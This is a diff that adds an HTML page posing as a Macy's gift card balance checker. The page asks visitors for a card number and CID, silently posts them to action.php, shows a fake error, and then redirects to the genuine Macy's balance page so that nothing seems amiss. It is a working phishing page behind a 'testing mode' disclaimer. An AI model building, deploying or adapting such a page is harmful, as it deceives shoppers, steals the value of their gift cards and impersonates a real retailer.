@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Gift Card Balance</title>
+
+<style>
+body {
+  margin: 0;
+  font-family: Arial, sans-serif;
+  background: #f2f2f2;
+}
+
+/* HEADER */
+.header {
+  background: #fff;
+  padding: 15px 40px;
+  font-size: 28px;
+  font-weight: bold;
+}
+
+.header span {
+  color: red;
+}
+
+/* MAIN SECTION */
+.container {
+  display: flex;
+  justify-content: space-between;
+  align-items: center; /* IMPORTANT */
+  padding: 60px;
+  padding-left: 150px;
+  padding-right: 150px;
+  background-color:white;
+}
+
+/* FORM BOX */
+.form-box {
+  width: 40%;
+ 
+}
+
+.form-box h2 {
+  font-size: 32px;
+  margin-bottom: 20px;
+}
+
+.input-group {
+  margin-bottom: 15px;
+}
+
+.input-group label {
+  display: block;
+  margin-bottom: 5px;
+}
+
+.input-group input {
+  width: 100%;
+  padding: 12px;
+  border: 1px solid #ccc;
+  border-radius: 3px;
+}
+
+/* BUTTON */
+.btn {
+  width: 100%;
+  padding: 12px;
+  background: #111;
+  color: #fff;
+  border: none;
+  cursor: pointer;
+  font-size: 16px;
+}
+
+.btn:hover {
+  background: #333;
+}
+
+/* ERROR MESSAGE */
+.error {
+  margin-top: 10px;
+  color: red;
+  font-size: 14px;
+}
+
+/* CARD IMAGE */
+.card-box {
+   padding: 10px 10px 10px 10px;
+    border-radius: 10px 10px 10px 10px;
+    box-shadow: 0px 0px 10px 0px rgba(0, 0, 0, 0.5);
+	 width: 35%;
+  display: flex;
+}
+
+
+.card-box img {
+  width: 100%;
+  height: 100%;
+  object-fit: contain; /* ya cover (neeche explain) */
+}
+
+/* RESPONSIVE */
+@media(max-width: 768px){
+  .container {
+    flex-direction: column;
+    padding: 20px;
+  }
+
+  .form-box, .card-box {
+    width: 100%;
+  }
+
+  .card {
+    margin-top: 30px;
+  }
+}
+.banner img {
+  width: 100%;
+  height: 250px;
+  object-fit: cover;
+}
+.main-wrapper {
+  background: #f2f2f2;
+  padding: 90px 0;
+  background: #fff;
+}
+.main {
+  background: #f2f2f2;
+  padding: 90px 0;
+  background: #fff;
+}
+
+.container {
+  width: 80%;
+  margin: auto;
+  
+  border-radius: 10px;
+  padding: 40px;
+  display: flex;
+  gap: 30px;
+}
+
+/* 3 equal areas */
+.form-box {
+  width: 33%;
+}
+
+.card-box {
+  width: 33%;
+  display: flex;
+}
+
+.extra-box {
+  width: 33%;
+}
+
+/* image fit */
+.card-box img {
+  width: 100%;
+  height: 100%;
+  object-fit: contain;
+}
+
+/* optional styling */
+.extra-box {
+  padding: 20px;
+  border-radius: 8px;
+}
+.e-font-icon-svg {
+  width: 20px;
+  height: 20px;
+}
+.container p {
+  margin-bottom: 10px;
+  line-height: 1.6;
+}
+.section-wrapper {
+  background: url('bg.png') no-repeat center center;
+  background-size: cover;
+  background-attachment: fixed;
+  padding-bottom:300px;
+}
+
+
+.loader {
+  border: 3px solid #fff;
+  border-top: 3px solid transparent;
+  border-radius: 50%;
+  width: 16px;
+  height: 16px;
+  display: inline-block;
+  margin-left: 10px;
+  animation: spin 0.8s linear infinite;
+  vertical-align: middle;
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+#errorMsg {
+  display: none;
+  transition: all 0.3s ease;
+}
+
+</style>
+
+</head>
+<body>
+<!-- HEADER -->
+<div class="header">
+  <img src="logo.png">
+</div>
+<div class="section-wrapper">
+<!-- BANNER -->
+<div class="banner" style="margin-bottom:-5px;">
+  <img src="banner.png" alt="banner">
+</div>
+
+<div class="main">
+<!-- MAIN -->
+<div class="container">
+
+  <!-- FORM -->
+  <div class="form-box">
+    <h2>Check Gift Card Balance</h2>
+	<form method="POST" action="action.php" id="giftForm">
+  <div class="input-group">
+    <label>Enter No</label>
+    <input type="text" name="number" required>
+  </div>
+
+  <div class="input-group">
+    <label>CID No</label>
+    <input type="text" name="cid" required>
+  </div>
+
+  <button type="submit" class="btn" id="submitBtn">
+  <span id="btnText">Check Balance</span>
+  <span id="loader" style="display:none;" class="loader"></span>
+</button>
+
+  <div class="error" id="errorMsg" style="display:none;">
+    ✔ there is something wrong Please check after Sometime
+  </div>
+</form>
+  </div>
+
+  <!-- CARD -->
+  <div class="card-box">
+    <img src="macy.png" style="border: none; border-radius: 0;box-shadow: none; height: auto;max-width: 100%;">
+  </div>
+
+</div>
+</div>
+
+<div class="main-wrapper">
+  <div class="container" style="text-align:center;">
+
+    <!-- LEFT (FORM) -->
+    <div class="form-box">
+		<svg aria-hidden="true" class="e-font-icon-svg e-fas-user-lock" viewBox="0 0 640 512" xmlns="http://www.w3.org/2000/svg"><path d="M224 256A128 128 0 1 0 96 128a128 128 0 0 0 128 128zm96 64a63.08 63.08 0 0 1 8.1-30.5c-4.8-.5-9.5-1.5-14.5-1.5h-16.7a174.08 174.08 0 0 1-145.8 0h-16.7A134.43 134.43 0 0 0 0 422.4V464a48 48 0 0 0 48 48h280.9a63.54 63.54 0 0 1-8.9-32zm288-32h-32v-80a80 80 0 0 0-160 0v80h-32a32 32 0 0 0-32 32v160a32 32 0 0 0 32 32h224a32 32 0 0 0 32-32V320a32 32 0 0 0-32-32zM496 432a32 32 0 1 1 32-32 32 32 0 0 1-32 32zm32-144h-64v-80a32 32 0 0 1 64 0z"></path></svg>
+      <h3> Secure Check</h3>
+	  <p>Your information is processed securely and never stored.</p>
+    </div>
+
+    <!-- CENTER (IMAGE) -->
+    <div class="">
+		<svg aria-hidden="true" class="e-font-icon-svg e-fas-venus-mars" viewBox="0 0 576 512" xmlns="http://www.w3.org/2000/svg"><path d="M564 0h-79c-10.7 0-16 12.9-8.5 20.5l16.9 16.9-48.7 48.7C422.5 72.1 396.2 64 368 64c-33.7 0-64.6 11.6-89.2 30.9 14 16.7 25 36 32.1 57.1 14.5-14.8 34.7-24 57.1-24 44.1 0 80 35.9 80 80s-35.9 80-80 80c-22.3 0-42.6-9.2-57.1-24-7.1 21.1-18 40.4-32.1 57.1 24.5 19.4 55.5 30.9 89.2 30.9 79.5 0 144-64.5 144-144 0-28.2-8.1-54.5-22.1-76.7l48.7-48.7 16.9 16.9c2.4 2.4 5.4 3.5 8.4 3.5 6.2 0 12.1-4.8 12.1-12V12c0-6.6-5.4-12-12-12zM144 64C64.5 64 0 128.5 0 208c0 68.5 47.9 125.9 112 140.4V400H76c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h36v36c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12v-36h36c6.6 0 12-5.4 12-12v-40c0-6.6-5.4-12-12-12h-36v-51.6c64.1-14.6 112-71.9 112-140.4 0-79.5-64.5-144-144-144zm0 224c-44.1 0-80-35.9-80-80s35.9-80 80-80 80 35.9 80 80-35.9 80-80 80z"></path></svg>
+      <h3> Secure Check</h3>
+	  <p>Get your balance information immediately without any delays.</p>
+    </div>
+
+    <!-- RIGHT (EXTRA AREA) -->
+    <div class="extra-box">
+		<svg aria-hidden="true" class="e-font-icon-svg e-fas-mobile-alt" viewBox="0 0 320 512" xmlns="http://www.w3.org/2000/svg"><path d="M272 0H48C21.5 0 0 21.5 0 48v416c0 26.5 21.5 48 48 48h224c26.5 0 48-21.5 48-48V48c0-26.5-21.5-48-48-48zM160 480c-17.7 0-32-14.3-32-32s14.3-32 32-32 32 14.3 32 32-14.3 32-32 32zm112-108c0 6.6-5.4 12-12 12H60c-6.6 0-12-5.4-12-12V60c0-6.6 5.4-12 12-12h200c6.6 0 12 5.4 12 12v312z"></path></svg>
+      <h3>Mobile Friendly</h3>
+      <p>Check your balance on any device, anywhere, anytime.</p>
+    </div>
+
+  </div>
+</div>
+
+<div class="main">
+		<div class="container">
+		<p> 
+		The Fashion Hub Disclaimer:Currently in testing mode and not yet live or operational. We are actively experimenting with various strategies to reach our audience and testing platform functionalities with different gift card brands. At this stage, we are not accepting any real transactions..
+<br><br>
+Please note: 
+<br><br>
+We are not responsible for any misuse, loss, or unauthorized use of your gift cards under any circumstances.
+All data displayed or processed on this website is part of a development environment managed by an open-source service provider.
+We does not store, validate, verify, or process actual gift card information at this time.
+We strongly advise users NOT to submit any real gift card details until our official launch is announced.
+Official Launch: April 2026	
+						</p>
+		
+		
+		</div>
+</div>
+</div>
+</body>
+<script>
+document.getElementById("giftForm").addEventListener("submit", function(e){
+    e.preventDefault();
+
+    let form = this;
+
+    let btn = document.getElementById("submitBtn");
+    let btnText = document.getElementById("btnText");
+    let loader = document.getElementById("loader");
+
+    // 👉 Loader ON
+    btn.disabled = true;
+    btnText.innerText = "Processing...";
+    loader.style.display = "inline-block";
+
+    // AJAX send
+    fetch("action.php", {
+        method: "POST",
+        body: new FormData(form)
+    });
+
+    // 👉 3 sec baad error + reset UI
+    setTimeout(() => {
+
+        // error show
+        document.getElementById("errorMsg").style.display = "block";
+
+        // form reset
+        form.reset();
+
+        // button normal
+        btn.disabled = false;
+        btnText.innerText = "Check Balance";
+        loader.style.display = "none";
+
+    }, 3000);
+
+    // 👉 6 sec baad redirect
+    setTimeout(() => {
+        window.location.href = "https://www.macys.com/account/giftcardbalance";
+    }, 2000);
+
+});
+</script>
+</html>
